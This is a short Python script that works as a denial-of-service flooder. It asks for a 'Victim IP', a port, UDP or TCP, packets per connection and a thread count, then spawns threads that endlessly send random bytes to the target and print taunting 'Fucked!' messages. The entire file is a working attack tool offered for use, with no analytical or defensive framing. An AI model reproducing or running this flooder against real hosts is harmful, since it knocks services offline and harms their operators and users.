import random
import socket
import threading
import sys
from time import sleep
for x in "Gunnn":
	print(x, end=''),sys.stdout.flush(),sleep(0.1)
	sleep(0.1)                                                                         
ip = str(input(" \nVictim IP:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[!!!]","[!!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[->] Fucked!..")
		except:
			print("[->] DENIED!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[!!!]","[!!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Fucked!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()